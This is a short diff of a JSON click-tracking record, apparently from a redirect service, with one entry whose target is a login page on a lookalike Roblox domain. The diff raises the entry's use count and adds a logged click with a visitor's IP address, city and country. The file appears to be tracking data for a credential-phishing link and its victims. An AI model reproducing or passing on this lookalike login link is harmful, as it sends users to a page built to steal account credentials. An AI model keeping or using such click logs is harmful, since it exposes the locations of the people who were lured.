@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1659,
+    "useCount": 1660,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13440,6 +13440,14 @@
         "city": "Taguig",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777602258496,
+        "ip": "138.99.33.30",
+        "country": "Brazil",
+        "city": "Vila Velha",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
